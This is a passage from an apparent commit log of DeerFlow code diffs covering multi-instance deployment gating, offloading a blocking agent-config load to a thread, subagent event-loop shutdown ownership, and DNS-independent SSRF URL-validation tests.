     scheduler = getattr(config, "scheduler", None)
     multi_instance_requested = bool(getattr(scheduler, "multi_instance", False))
     multi_instance_scheduler = bool(getattr(scheduler, "enabled", False) and multi_instance_requested)
@@ -127,34 +177,54 @@ def _enforce_postgres_for_multi_worker(config: AppConfig) -> None:
     if multi_instance_requested and (run_ownership is None or not run_ownership.heartbeat_enabled):
         raise SystemExit("scheduler.multi_instance=true requires run_ownership.heartbeat_enabled=true so peer runs retain a valid lease. Set scheduler.multi_instance=false or enable run ownership heartbeats.")
 
-    if workers <= 1:
+    signal = _multi_process_signal(config)
+    if signal is None:
         return
+    reason, rollback = signal
 
     if config.scheduler.enabled and not multi_instance_scheduler:
```

**File**: `backend/app/gateway/routers/channel_connections.py` (modified, +7/-2)
```diff
@@ -21,6 +21,7 @@
 from app.gateway.deps import require_admin_user
 from app.gateway.persistent_writes import run_drained_write
 from deerflow.config.channel_connections_config import ChannelConnectionsConfig
+from deerflow.config.deployment_config import multi_instance_declaration
 from deerflow.persistence.channel_connections import ChannelConnectionRepository
 from deerflow.persistence.engine import get_session_factory
 from deerflow.utils.file_io import await_drained
@@ -772,10 +773,14 @@ async def _require_wechat_qr_login(request: Request) -> ChannelConnectionsConfig
         workers = int(os.environ.get("GATEWAY_WORKERS") or os.environ.get("WEB_CONCURRENCY") or "1")
     except ValueError:
         workers = 0
-    if workers != 1:
+    # Kubernetes replicas run one worker each; they declare their peers instead.
+    if workers != 1 or multi_instance_declaration(_get_app_config()) is not None:
         raise HTTPException(
             status_code=503,
-            detail="WeChat QR login requires a single Gateway worker. Set GATEWAY_WORKERS=1 (or WEB_CONCURRENCY=1 when using Uvicorn directly), or enter a bot token manually.",
+            detail=(
+                "WeChat QR login requires a single Gateway worker. Set GATEWAY_WORKERS=1 (or WEB_CONCURRENCY=1 when using Uvicorn directly), "
+                "run one Gateway instance without deployment.multi_instance / DEER_FLOW_MULTI_INSTANCE, or enter a bot token manually."
+            ),
         )
     return config
 
```

**File**: `backend/docs/CONFIGURATION.md` (modified, +16/-1)
```diff
@@ -518,14 +518,29 @@ Notes:
 - **Upgrade note:** before upgrading a deployment with `GATEWAY_WORKERS > 1` and `scheduler.enabled: true`, either run the scheduler on exactly one Gateway worker or enable `scheduler.multi_instance: true` with shared Postgres, `run_ownership.heartbeat_enabled: true`, and `run_events.backend: db`. The startup gate now rejects the unsafe combination instead of allowing it to start silently.
 - **Upgrade note:** in multi-instance mode, `max_concurrent_runs` is cluster-wide rather than per Pod and counts `launching`/`running` occurrences. Waiting `queued` rows remain outside the execution cap; capacity does not multiply with the replica count.
 - **Upgrade note:** `scheduler.multi_instance` and its related scheduler, ownership, and run-event settings are startup-only. Restart all Gateway Pods together after changing them; a ConfigMap update without a coordinated restart leaves the running service on its previous mode.
-- Multi-worker deployments (`GATEWAY_WORKERS > 1`) must use the Postgres database backend, enable run ownership heartbeats, and set `run_events.backend: db`. SQLite silently ignores row-level locks, while memory and JSONL run-event stores are process-local and cannot enforce singleton delivery receipts across workers; startup rejects these combinations. The process-local agentic browser tool group is incompatible with multiple Gateway workers; keep the Gateway to one worker process while `browser_navigate` is enabled — `GATEWAY_WORKERS=1`, plus `WEB_CONCURRENCY` unset or `1` on launches that pass uvicorn no worker count (`backend/Dockerfile`, `scripts/serve.sh`), where uvicorn takes the process count from it. Browser control also requires the backend `browser` extra (`cd backend && uv sync --extra browser && uv run playwright install chromium`); startup detects enabled browser config and fails fast when Playwright is missing, and `/api/features` reports `browser_control.enabled=false` until the runtime is available.
+- Multi-worker deployments (`GATEWAY_WORKERS > 1`) and declared multi-instance deployments (`deployment.multi_instance: true` / `DEER_FLOW_MULTI_INSTANCE=1`, see [Deployment topology](#deployment-topology-multi-instance)) must use the Postgres database backend, enable run ownership heartbeats, set `run_events.backend: db`, and use the Redis stream bridge. SQLite silently ignores row-level locks, while memory and JSONL run-event stores are process-local and cannot enforce singleton delivery receipts across workers; startup rejects these combinations. The process-local agentic browser tool group is incompatible with multiple Gateway workers; keep the Gateway to one worker process while `browser_navigate` is enabled — `GATEWAY_WORKERS=1`, plus `WEB_CONCURRENCY` unset or `1` on launches that pass uvicorn no worker count (`backend/Dockerfile`, `scripts/serve.sh`), where uvicorn takes the process count from it. Browser control also requires the backend `browser` extra (`cd backend && uv sync --extra browser && uv run playwright install chromium`); startup detects enabled browser config and fails fast when Playwright is missing, and `/api/features` reports `browser_control.enabled=false` until the runtime is available.
 - The MVP supports thread reuse and fresh-thread-per-run execution modes.
 - Create/update accept optional `assistant_id` (`lead_agent` by default, or an existing custom agent for the task owner).
 - Create/update accept `once`, `cron`, and `interval`. Interval uses `schedule_spec.every_seconds` (UTC `now + N`, no missed-beat catch-up). N is at least `min_once_delay_seconds` (default 60) and at most 30 days.
 - Manual trigger uses the same scheduled-task resource and run lifecycle.
 - Scheduled task definitions and task-run history are persisted in the application database.
 - With `channel_connections.enabled: true`, the scheduler enqueues IM outcome notifications for the task owner's connected identities. A delivery worker (same poll cadence as the scheduler) pushes them. Scheduled runs that finish as success or failed notify. For goal tasks, an `unmet` scheduled occurrence sends a goal-unmet notice instead, and an automatic pause after three unmet occurrences sends an auto-pause notice; a stop requested by the agent adds no separate notice. Manual triggers and interrupts stay silent, and so do occurrences that end without a finished run (launch error, queue timeout, restart recovery). Channel/transport outages park rows without consuming the retry budget, for up to about a day; platform rejections exhaust ~15 minutes of counted retries then settle `failed`. The worker re-checks the binding right before sending: a target the owner has disconnected since enqueue is dropped as `failed`, never pushed. Only WeCom currently implements proactive `send_notification`.
 
+### Deployment topology (multi-instance)
+
+```yaml
+deployment:
+  multi_instance: false
+```
+
+Notes:
+
+- `GATEWAY_WORKERS` / `WEB_CONCURRENCY` only count the uvicorn workers of 
```

---

### Incident Patch 2: `c2f31e44` (2026-10-05)
**Commit Message**: fix(knowledge): load the catalog's agent config off the event loop (#6313)

* fix(knowledge): load the catalog's agent config off the event loop

Both retrieval-catalog handlers called load_agent_config() directly from
async code. The agent store is synchronous: file IO on the file backend,
a sync SQLAlchemy round trip on the db backend, so a slow disk or
database stalled every other Gateway request. Offload the load with
asyncio.to_thread, matching agents.py, scheduled_tasks.py and the
run-admission path in services.py.

The strict Blockbuster anchors drive both handlers end to end against
real file and SQLite agent stores, plus the unknown-agent 404 path.

* docs(changelog): reference #6313 for the knowledge catalog fix

* Added the Chinese changelog entry back

---------

Co-authored-by: Willem Jiang <[REDACTED_EMAIL]>

**File**: `CHANGELOG.md` (modified, +10/-0)
```diff
@@ -479,6 +479,15 @@ This release closes that milestone with **301 merged pull requests**.
 
 ### Fixed
 
+- **gateway:** The knowledge retrieval catalog no longer blocks the Gateway event
+  loop while it loads a custom agent's config. Both
+  `GET /api/knowledge/retrieval-catalog/datasets` and
+  `.../datasets/{id}/documents` read the agent through the sync agent store on
+  the loop, which means file IO on the `file` backend and a synchronous
+  SQLAlchemy round trip on the `db` backend, so a slow disk or database stalled
+  every other request. The load now runs in `asyncio.to_thread`, like the other
+  Gateway routes that read agent configs; responses and the 404 for an unknown
+  agent are unchanged. ([#6313])
 - **gateway:** Deleting a thread with a large workspace no longer freezes every
   other Gateway request while its files are removed. `DELETE /api/threads/{id}`
   ran `shutil.rmtree` over the thread directory on the event loop, so other
@@ -7787,5 +7796,6 @@ with **180 merged pull requests** since the first 2.0 milestone tag.
 [#6305]: https://github.com/bytedance/deer-flow/pull/6305
 [#6306]: https://github.com/bytedance/deer-flow/pull/6306
 [#6307]: https://github.com/bytedance/deer-flow/pull/6307
+[#6313]: https://github.com/bytedance/deer-flow/pull/6313
 [#6319]: https://github.com/bytedance/deer-flow/pull/6319
 [#6326]: https://github.com/bytedance/deer-flow/pull/6326
```

**File**: `CHANGELOG_zh.md` (modified, +7/-0)
```diff
@@ -432,6 +432,12 @@
 
 ### 修复
 
+- **网关：** 知识检索目录加载自定义 Agent 配置时不再阻塞网关事件循环。
+  `GET /api/knowledge/retrieval-catalog/datasets` 与 `.../datasets/{id}/documents`
+  此前在事件循环上通过同步 Agent 存储读取 Agent：`file` 后端为文件 IO，`db` 后端
+  为一次同步 SQLAlchemy 往返，磁盘或数据库变慢时会拖住所有其他请求。现在与其他
+  读取 Agent 配置的网关路由一样，在 `asyncio.to_thread` 中加载；响应内容以及未知
+  Agent 返回的 404 保持不变。([#6313])
 - **网关：** 删除工作区较大的线程时，移除文件期间不再冻结 Gateway 的其他所有请求。
   `DELETE /api/threads/{id}` 此前在事件循环上对线程目录执行 `shutil.rmtree`，
   因此其他请求与进行中的 SSE 流都要等到整棵目录树删除完毕（本地 SSD 上 20,000 个
@@ -6492,5 +6498,6 @@ DeerFlow 2.0 是围绕"超级智能体"框架的彻底重写，核心包含子
 [#6305]: https://github.com/bytedance/deer-flow/pull/6305
 [#6306]: https://github.com/bytedance/deer-flow/pull/6306
 [#6307]: https://github.com/bytedance/deer-flow/pull/6307
+[#6313]: https://github.com/bytedance/deer-flow/pull/6313
 [#6319]: https://github.com/bytedance/deer-flow/pull/6319
 [#6326]: https://github.com/bytedance/deer-flow/pull/6326
```

**File**: `backend/app/gateway/routers/knowledge.py` (modified, +7/-4)
```diff
@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import asyncio
 import logging
 from collections.abc import Awaitable
 from typing import Annotated, Any
@@ -62,12 +63,14 @@ async def _catalog_result[Result](operation: Awaitable[Result]) -> Result:
         raise HTTPException(status_code=502, detail="RAGFlow request failed.") from None
 
 
-def _scope_catalog(config: AppConfig, agent_name: str):
+async def _scope_catalog(config: AppConfig, agent_name: str):
     knowledge_base = config.knowledge_base
     agent_config = None
     if agent_name != "lead_agent":
         try:
-            agent_config = load_agent_config(
+            # The agent store reads files or makes a sync DB round trip.
+            agent_config = await asyncio.to_thread(
+                load_agent_config,
                 agent_name,
                 user_id=get_effective_user_id(),
             )
@@ -118,7 +121,7 @@ async def list_retrieval_catalog_datasets(
     config: AppConfig = Depends(get_config),
 ) -> dict[str, Any]:
     """Return only datasets that the operator permits this agent to retrieve."""
-    settings = _scope_catalog(config, agent_name)
+    settings = await _scope_catalog(config, agent_name)
     client = _build_retrieval_client(settings)
     datasets, error = await _catalog_result(
         resolve_ragflow_datasets(client, settings),
@@ -164,7 +167,7 @@ async def list_retrieval_catalog_documents(
     config: AppConfig = Depends(get_config),
 ) -> dict[str, Any]:
     """Return a normalized, read-only document page inside operator scope."""
-    settings = _scope_catalog(config, agent_name)
+    settings = await _scope_catalog(config, agent_name)
     if settings.datasets is not None and dataset_id not in set(settings.datasets):
         raise HTTPException(status_code=404, detail="Knowledge base not found.")
     client = _build_retrieval_client(settings)
```

**File**: `backend/tests/blocking_io/test_knowledge_router.py` (added, +161/-0)
```diff
@@ -0,0 +1,161 @@
+"""Regression anchors: the knowledge catalog must not block the event loop.
+
+Both retrieval-catalog handlers load the custom agent's config to decide
+whether it may select a knowledge scope. That read goes through the sync agent
+store — file IO on the ``file`` backend, a sync SQLAlchemy round trip on the
+``db`` backend — so it is offloaded via ``asyncio.to_thread``. If it regresses
+onto the event loop, the strict Blockbuster gate raises ``BlockingError``.
+
+The handlers are driven end to end (not the scope helper) so the anchors fail
+if a call site stops awaiting the offloaded load. ``@require_permission`` is
+bypassed via ``__wrapped__``; RAGFlow is replaced with an in-memory fake.
+Imports sit at module top so import-time IO runs at collection, outside the
+gate.
+"""
+
+from __future__ import annotations
+
+from pathlib import Path
+from types import SimpleNamespace
+from unittest.mock import AsyncMock
+
+import pytest
+from fastapi import HTTPException
+from sqlalchemy import create_engine
+
+from app.gateway.knowledge_scope_admission import RAGFLOW_KNOWLEDGE_SEARCH_PROVIDER
+from app.gateway.routers import knowledge
+from deerflow.config.paths import get_paths
+from deerflow.persistence.agents.model import AgentRow
+from deerflow.persistence.agents.sql import SqlAgentStore
+from deerflow.persistence.base import Base
+from deerflow.runtime.user_context import get_effective_user_id
+
+pytestmark = pytest.mark.asyncio
+
+# The undecorated coroutines (``require_permission`` uses ``functools.wraps``).
+_list_datasets = knowledge.list_retrieval_catalog_datasets.__wrapped__
+_list_documents = knowledge.list_retrieval_catalog_documents.__wrapped__
+
+_AGENT = "kb-agent"
+
+
+@pytest.fixture(autouse=True)
+def _isolate_agent_store_config(tmp_path: Path, monkeypatch) -> None:
+    monkeypatch.delenv("DEER_FLOW_CONFIG_PATH", raising=False)
+    monkeypatch.setenv("DEER_FLOW_PROJECT_ROOT", str(tmp_path))
+    monkeypatch.setenv("DEER_FLOW_HOME", str(tmp_path))
+    monkeypatch.setattr("deerflow.config.app_config._legacy_config_candidates", lambda: ())
+    monkeypatch.setattr("deerflow.config.paths._paths", None)
+
+
+def _seed_file_agent() -> None:
+    agent_dir = get_paths().user_agent_dir(get_effective_user_id(), _AGENT)
+    agent_dir.mkdir(parents=True, exist_ok=True)
+    (agent_dir / "config.yaml").write_text(f"name: {_AGENT}\ntool_groups: [knowledge]\n", encoding="utf-8")
+
+
+def _seed_db_agent(tmp_path: Path) -> SqlAgentStore:
+    url = f"sqlite:///{tmp_path}/agents.db"
+    engine = create_engine(url)
+    Base.metadata.create_all(engine, tables=[AgentRow.__table__])
+    engine.dispose()
+    store = SqlAgentStore(url)
+    store.create(_AGENT, {"name": _AGENT, "tool_groups": ["knowledge"]}, None, user_id=get_effective_user_id())
+    return store
+
+
+@pytest.fixture(params=["file", "db"])
+def seeded_agent_store(request, tmp_path: Path, monkeypatch) -> None:
+    # Sync fixture: seeding runs before the loop starts, so only the handlers'
+    # own IO is exercised on it.
+    if request.param == "file":
+        _seed_file_agent()
+        return
+    store = _seed_db_agent(tmp_path)
+    monkeypatch.setattr("deerflow.persistence.agents.get_agent_store", lambda: store)
+
+
+def _config() -> SimpleNamespace:
+    tool = SimpleNamespace(
+        use=RAGFLOW_KNOWLEDGE_SEARCH_PROVIDER,
+        model_extra={
+            "base_url": "http://ragflow.test",
+            "api_key": "ragflow-secret",
+            "timeout": 30,
+            "datasets": ["dataset-1"],
+        },
+    )
+    return SimpleNamespace(
+        knowledge_base=SimpleNamespace(enabled=True, scope_selection_enabled=True),
+        get_tool_config=lambda name: tool if name == "knowledge_search" else None,
+    )
+
+
+def _fake_ragflow(monkeypatch) -> SimpleNamespace:
+    ragflow = SimpleNamespace(
+        list_datasets=AsyncMock(
+            return_value=[
+                {
+                    "id": "dataset-1",
+                    "name": "Policies",
+                    "embedding_model": "embed-a",
+                    "chunk_count": 3,
+                }
+            ]
+        ),
+        list_documents=AsyncMock(
+            return_value={
+                "code": 0,
+                "data": {
+                    "total": 1,
+                    "docs": [{"id": "doc-1", "name": "Ready.pdf", "run": "DONE", "chunk_count": 2}],
+                },
+            }
+        ),
+    )
+    monkeypatch.setattr(knowledge, "_build_retrieval_client", lambda settings: ragflow)
+    return ragflow
+
+
+@pytest.mark.usefixtures("seeded_agent_store")
+async def test_catalog_handlers_do_not_block_event_loop(monkeypatch) -> None:
+    _fake_ragflow(monkeypatch)
+
+    datasets = await _list_datasets(
+        request=None,
+        agent_name=_AGENT,
+        page=1,
+        page_size=20,
+        search="",
+        config=_config(),
+    )
+    documents = await _list_documents(
+        "dataset-1",
+   
```

---

### Incident Patch 3: `78150e9b` (2026-10-05)
**Commit Message**: fix(subagents): keep isolated-loop shutdown ownership retryable (#6316)

* fix(subagents): retain isolated-loop shutdown ownership

* fix(subagents): reap stopped isolated loop before replacement

* test(subagents): cover pending-loop recovery after worker exit

* docs(subagents): document pending-loop recovery

* fix(subagents): revalidate pending loop recovery

**File**: `backend/packages/harness/deerflow/subagents/AGENTS.md` (modified, +1/-1)
```diff
@@ -42,7 +42,7 @@ does not change retry policy.
 **Upload-state boundary**: Ordinary `task` delegation snapshots a valid parent `ThreadState.uploaded_files` list at dispatch, deep-copies it across the isolated-loop boundary, seeds it into the child's fresh state, and only then makes `list_uploaded_files` eligible for normal tool-policy filtering. An explicit empty list is valid and must be preserved because it means every upload in the thread is historical for this run. Missing or malformed state fails closed with the tool disabled. Durable `batch_task` execution intentionally keeps the tool disabled: delayed and recovered items have no valid parent-run upload boundary, and supporting that case requires a separate persisted-state contract.
 **Knowledge-scope boundary**: `task` and `batch_task` inherit the parent's canonical execution scope, never display data. Batch specs persist it across lease recovery; malformed scope fails. Model input cannot set or broaden it, and shared middleware/retrieval enforce `disabled`.
 **Date context (#4781)**: Every built-in subagent execution registers `SubagentDateContextMiddleware` immediately before `SystemMessageCoalescingMiddleware`. Its one-time `before_agent` hook adds a hidden framework-owned `SystemMessage` containing only `<current_date>` before the first model call; it does not read `AppConfig.memory`, call the memory manager, rewrite the task `HumanMessage`, or inherit the lead agent's frozen-conversation/midnight lifecycle. The coalescer merges that reminder with the subagent's static prompt so strict providers still receive exactly one leading `SystemMessage`. The lead-only `DynamicContextMiddleware` registration and its date, optional-memory, and midnight-update behavior remain unchanged.
-**Execution**: Ordinary and durable-batch native subagents submit coroutines directly to one persistent isolated event loop. Gateway/embedded startup installs one process-wide async FIFO admission controller (default 3 running, bounded queue). Direct `create_deerflow_agent` callers can instead pass a caller-owned `SubagentRuntime`; reuse the same instance across graphs so its bound `task`, optional batch tools/service, middleware limits, and `SubagentExecutor` all share one controller without reading global YAML. An owned batch service must be started before graph construction and stopped at application shutdown. Waiters hold no scheduler thread, and cancellation/timeout release queue/slot ownership.
+**Execution**: Ordinary and durable-batch native subagents submit coroutines directly to one persistent isolated event loop. Shutdown keeps loop/thread ownership until the worker is confirmed stopped; a bounded join is not proof of termination, and new submissions stay fenced while cleanup is pending. Once the retained worker has exited, the next submission reaps and closes that loop under the shutdown lifecycle lock before creating a replacement. Gateway/embedded startup installs one process-wide async FIFO admission controller (default 3 running, bounded queue). Direct `create_deerflow_agent` callers can instead pass a caller-owned `SubagentRuntime`; reuse the same instance across graphs so its bound `task`, optional batch tools/service, middleware limits, and `SubagentExecutor` all share one controller without reading global YAML. An owned batch service must be started before graph construction and stopped at application shutdown. Waiters hold no scheduler thread, and cancellation/timeout release queue/slot ownership.
 **Shared sandbox execution lifecycle** (#5128): every admitted subagent run carries a stable task-derived `sandbox_lease_owner_id` and matching `sandbox_command_scope_id` in its runtime context. Sandbox middleware retains that execution against the lead thread's active provider client, so one child finishing cannot close the sandbox while siblings still run; the final holder performs any pending provider release. A rollback/fork-restored child reusing the parent's live client binds a non-releasing holder: it fences parent cleanup and owns its command scope without requesting a park itself; a parent's earlier park request waits for the child, while a missing inherited client falls through to a normal fresh acquire. On AIO, the command scope selects one explicit persistent shell session per subagent, allowing independent scopes to run concurrently while preserving in-order shell state within one child. Sync sandbox tool bodies offloaded with `asyncio.to_thread` are shielded and drained across repeated cancellation before the outer execution can clean its holder; a cancelled worker can therefore neither re-admit an already-released owner nor run after subagent terminalization. `SubagentExecutor` invokes active LangGraph stream cleanup before releasing its sandbox lease or notifying task stop. Slow cooperative cleanup keeps the result non-terminal and retains its sandbox lease and capacity slot; its warning is diagnostic, not a safe hard-timeout boundary. Middlew
```

**File**: `backend/packages/harness/deerflow/subagents/executor.py` (modified, +65/-23)
```diff
@@ -597,7 +597,9 @@ def _harvest_bash_executions(
 _isolated_subagent_loop: asyncio.AbstractEventLoop | None = None
 _isolated_subagent_loop_thread: threading.Thread | None = None
 _isolated_subagent_loop_started: threading.Event | None = None
+_isolated_subagent_loop_shutdown_pending = False
 _isolated_subagent_loop_lock = threading.Lock()
+_isolated_subagent_loop_shutdown_lock = threading.Lock()
 
 
 def _run_isolated_subagent_loop(
@@ -613,47 +615,76 @@ def _run_isolated_subagent_loop(
         started_event.clear()
 
 
-def _shutdown_isolated_subagent_loop() -> None:
+def _shutdown_isolated_subagent_loop(*, only_if_pending: bool = False) -> None:
     """Stop and close the persistent isolated subagent loop."""
-    global _isolated_subagent_loop, _isolated_subagent_loop_thread, _isolated_subagent_loop_started
+    global _isolated_subagent_loop, _isolated_subagent_loop_thread, _isolated_subagent_loop_started, _isolated_subagent_loop_shutdown_pending
 
-    with _isolated_subagent_loop_lock:
-        loop = _isolated_subagent_loop
-        thread = _isolated_subagent_loop_thread
-        _isolated_subagent_loop = None
-        _isolated_subagent_loop_thread = None
-        _isolated_subagent_loop_started = None
+    with _isolated_subagent_loop_shutdown_lock:
+        with _isolated_subagent_loop_lock:
+            # Dispatch recovery can become stale while waiting for this lock.
+            # Recheck the fence before touching the current loop generation.
+            if only_if_pending and not _isolated_subagent_loop_shutdown_pending:
+                return
+            loop = _isolated_subagent_loop
+            thread = _isolated_subagent_loop_thread
+            if loop is None:
+                _isolated_subagent_loop_shutdown_pending = False
+                return
+            _isolated_subagent_loop_shutdown_pending = True
 
-    if loop is None:
-        return
+            # A previous bounded shutdown/startup attempt already requested
+            # loop.stop. Dispatch-side recovery should only probe whether the
+            # retained worker has exited; repeatedly joining here would stall
+            # every caller for up to one second while the worker remains live.
+            if only_if_pending and thread is not None and thread.is_alive():
+                return
 
-    if loop.is_running():
-        loop.call_soon_threadsafe(loop.stop)
+        if loop.is_running():
+            loop.call_soon_threadsafe(loop.stop)
 
-    if thread is not None and thread.is_alive() and thread is not threading.current_thread():
-        thread.join(timeout=1)
+        if thread is not None and thread.is_alive() and thread is not threading.current_thread():
+            thread.join(timeout=1)
 
-    thread_stopped = thread is None or not thread.is_alive()
-    loop_stopped = not loop.is_running()
+        thread_stopped = thread is None or not thread.is_alive()
+        loop_stopped = not loop.is_running()
 
-    if not loop.is_closed():
-        if thread_stopped and loop_stopped:
-            loop.close()
-        else:
+        if not thread_stopped or not loop_stopped:
             logger.warning(
-                "Skipping close of isolated subagent loop because shutdown did not complete within timeout (thread_alive=%s, loop_running=%s)",
+                "Retaining isolated subagent loop ownership because shutdown did not complete within timeout (thread_alive=%s, loop_running=%s)",
                 thread is not None and thread.is_alive(),
                 loop.is_running(),
             )
+            return
+
+        if not loop.is_closed():
+            loop.close()
+
+        with _isolated_subagent_loop_lock:
+            if _isolated_subagent_loop is loop and _isolated_subagent_loop_thread is thread:
+                _isolated_subagent_loop = None
+                _isolated_subagent_loop_thread = None
+                _isolated_subagent_loop_started = None
+                _isolated_subagent_loop_shutdown_pending = False
 
 
 atexit.register(_shutdown_isolated_subagent_loop)
 
 
 def _get_isolated_subagent_loop() -> asyncio.AbstractEventLoop:
     """Return the persistent event loop used by isolated subagent executions."""
-    global _isolated_subagent_loop, _isolated_subagent_loop_thread, _isolated_subagent_loop_started
+    global _isolated_subagent_loop, _isolated_subagent_loop_thread, _isolated_subagent_loop_started, _isolated_subagent_loop_shutdown_pending
+
+    # A startup/shutdown timeout retains ownership while the worker is alive.
+    # Ordinary dispatch is also the retry path once that worker has actually
+    # exited: reap the retained loop under the shutdown lifecycle lock before
+    # deciding whether replacement is still fenced.
+    if _isolated_subagent_loop_shutdown_pending:
+        _shutdown_isolated_subagent_loop(only_if_pending=True)
+
     with _isolated_subagent_loop_lock:
+        if _isolated_subagent_loop_shutdown_pending:
+            raise RuntimeError("Isola
```

**File**: `backend/packages/harness/deerflow/tools/builtins/task_tool.py` (modified, +2/-2)
```diff
@@ -498,8 +498,8 @@ def _schedule_deferred_subagent_cleanup(
     try:
         cleanup_handle = run_on_isolated_subagent_loop(coro)
     except Exception:
-        # Unreachable in practice — the persistent loop backs the subagent
-        # execution itself, so it exists by the time a poller needs cleanup.
+        # The persistent loop can be temporarily fenced while retained
+        # shutdown ownership is still exiting; keep cleanup on the caller loop.
         logger.warning(
             f"[trace={trace_id}] Persistent subagent loop unavailable for deferred cleanup of {execution_id}; falling back to the caller loop",
             exc_info=True,
```

**File**: `backend/tests/test_subagent_executor.py` (modified, +279/-0)
```diff
@@ -3134,6 +3134,285 @@ async def schedule_from_caller() -> None:
         # it returns only once the coroutine ran and the future resolved.
         assert handles[0].result(timeout=10) is None
 
+    def test_shutdown_retains_isolated_loop_ownership_until_worker_exits(self, executor_module):
+        """A bounded join must not detach a still-live persistent loop."""
+
+        class StubbornThread:
+            def __init__(self):
+                self.alive = True
+                self.join_calls = 0
+
+            def is_alive(self):
+                return self.alive
+
+            def join(self, timeout=None):
+                self.join_calls += 1
+
+        class DeferredStopLoop:
+            def __init__(self):
+                self.running = True
+                self.closed = False
+                self.stop_calls = 0
+
+            def is_running(self):
+                return self.running
+
+            def stop(self):
+                self.stop_calls += 1
+
+            def call_soon_threadsafe(self, callback, *args):
+                self.stop_calls += 1
+
+            def is_closed(self):
+                return self.closed
+
+            def close(self):
+                assert not self.running
+                self.closed = True
+
+        loop = DeferredStopLoop()
+        thread = StubbornThread()
+        started = threading.Event()
+        started.set()
+
+        executor_module._isolated_subagent_loop = loop
+        executor_module._isolated_subagent_loop_thread = thread
+        executor_module._isolated_subagent_loop_started = started
+        executor_module._isolated_subagent_loop_shutdown_pending = False
+
+        executor_module._shutdown_isolated_subagent_loop()
+
+        assert executor_module._isolated_subagent_loop is loop
+        assert executor_module._isolated_subagent_loop_thread is thread
+        assert executor_module._isolated_subagent_loop_started is started
+        assert executor_module._isolated_subagent_loop_shutdown_pending is True
+        assert loop.closed is False
+        assert thread.join_calls == 1
+
+        with patch.object(executor_module.asyncio, "new_event_loop") as new_event_loop:
+            with pytest.raises(RuntimeError, match="shutdown is still pending"):
+                executor_module._get_isolated_subagent_loop()
+            new_event_loop.assert_not_called()
+
+        thread.alive = False
+        loop.running = False
+        replacement = executor_module._get_isolated_subagent_loop()
+
+        assert loop.closed is True
+        assert replacement is not loop
+        assert executor_module._isolated_subagent_loop is replacement
+        assert executor_module._isolated_subagent_loop_thread is not thread
+        assert executor_module._isolated_subagent_loop_shutdown_pending is False
+
+        executor_module._shutdown_isolated_subagent_loop()
+        assert executor_module._isolated_subagent_loop is None
+        assert executor_module._isolated_subagent_loop_thread is None
+        assert executor_module._isolated_subagent_loop_started is None
+        assert executor_module._isolated_subagent_loop_shutdown_pending is False
+
+    def test_startup_timeout_retains_ownership_until_worker_exits(self, executor_module, caplog):
+        """A startup timeout must retain the worker and allow later reaping."""
+
+        class StartupEvent:
+            def wait(self, timeout=None):
+                return False
+
+        class StartupThread:
+            def __init__(self, *args, **kwargs):
+                self.alive = False
+                self.join_calls = 0
+
+            def start(self):
+                self.alive = True
+
+            def is_alive(self):
+                return self.alive
+
+            def join(self, timeout=None):
+                self.join_calls += 1
+
+        class StartupLoop:
+            def __init__(self):
+                self.running = True
+                self.closed = False
+
+            def is_running(self):
+                return self.running
+
+            def stop(self):
+                self.running = False
+
+            def call_soon_threadsafe(self, callback, *args):
+                callback(*args)
+
+            def is_closed(self):
+                return self.closed
+
+            def close(self):
+                assert not self.running
+                self.closed = True
+
+        retained = StartupLoop()
+        startup_thread = StartupThread()
+        startup_event = StartupEvent()
+
+        with (
+            caplog.at_level("WARNING"),
+            patch.object(executor_module.asyncio, "new_event_loop", return_value=retained),
+            patch.object(executor_module.threading, "Event", return_value=startup_event),
+            patch.object(executor_module.threading, "Thread", return_value=startup_thread),
+        ):
+            with pytest.raises(RuntimeError, match="Timed out starting isolated subagent event loop"):
+                executor_module._get_iso
```

---

### Incident Patch 4: `d8ca2c93` (2026-10-05)
**Commit Message**: test(community): make URL offload regressions DNS-independent (#6314)

* test(community): make URL offload regressions DNS-independent

* test(community): reject unsupported DNS fixture families

---------

Co-authored-by: Willem Jiang <[REDACTED_EMAIL]>

**File**: `backend/tests/AGENTS.md` (modified, +8/-0)
```diff
@@ -6,6 +6,14 @@ Browser-asset confinement tests use `support.symlinks.symlink_or_skip` for real
 file and directory symlinks. Keep missing-file, duplicate-key, and size-limit
 checks separate so they still run when the host cannot create symlinks.
 
+`blocking_io/test_web_tool_url_validation.py` resolves a synthetic `.invalid`
+hostname to loopback by patching `_socket.getaddrinfo`, below the real
+`socket.getaddrinfo` wrapper. Do not replace that wrapper or the production URL
+guard: the strict gate must still reject on-loop resolution. Assert each tool
+path reaches the native fixture so an unresolved-host rejection cannot mask it.
+The IPv4 fixture accepts only `AF_UNSPEC` and `AF_INET`; unsupported families
+must fail rather than receive a fabricated IPv4 answer.
+
 The local sandbox's UTF-8 subprocess guard inspects each text-mode call with
 `ast`, checking both `encoding` and `errors`; module-wide literal counts can
 hide unpinned calls behind unrelated settings.
```

**File**: `backend/tests/blocking_io/test_web_tool_url_validation.py` (modified, +66/-14)
```diff
@@ -1,50 +1,96 @@
 """Web tools must resolve SSRF-screened hostnames off the agent event loop.
 
-``http://127.1/`` is not an ``ipaddress`` literal, so the URL guard hands it to
-the real ``socket.getaddrinfo``, which expands it to 127.0.0.1 without any DNS
-traffic. The strict gate's ``socket.getaddrinfo`` rule fails each test if the
-tool resolves on the loop instead of in a worker thread.
+A synthetic hostname resolves to loopback through a native resolver fixture,
+without depending on platform-specific numeric-host parsing or external DNS.
+The real ``socket.getaddrinfo`` wrapper and the strict gate's rule remain active,
+so resolution on the loop still fails instead of reaching the fixture.
 """
 
+import _socket
 import asyncio
+import socket
 from types import SimpleNamespace
 from unittest.mock import MagicMock, patch
 
 import pytest
+from blockbuster import BlockingError
 
 from deerflow.community.browser_automation import tools as browser_tools
 from deerflow.community.browser_automation.egress import BrowserEgressProxy
 from deerflow.community.browserless import tools as browserless_tools
 from deerflow.community.crawl4ai import tools as crawl4ai_tools
+from deerflow.community.url_safety import resolve_host_addresses
 
 pytestmark = pytest.mark.asyncio
 
-_UNRESOLVED_LOOPBACK_URL = "http://127.1/"
+_LOOPBACK_HOST = "loopback.test.invalid"
+_UNRESOLVED_LOOPBACK_URL = f"http://{_LOOPBACK_HOST}/"
 
 
-async def test_crawl4ai_web_fetch_resolves_off_loop() -> None:
+@pytest.fixture
+def loopback_dns(monkeypatch: pytest.MonkeyPatch) -> list[str]:
+    calls: list[str] = []
+    native_getaddrinfo = _socket.getaddrinfo
+
+    def getaddrinfo(host, port, family=socket.AF_UNSPEC, *args, **kwargs):
+        if host == _LOOPBACK_HOST:
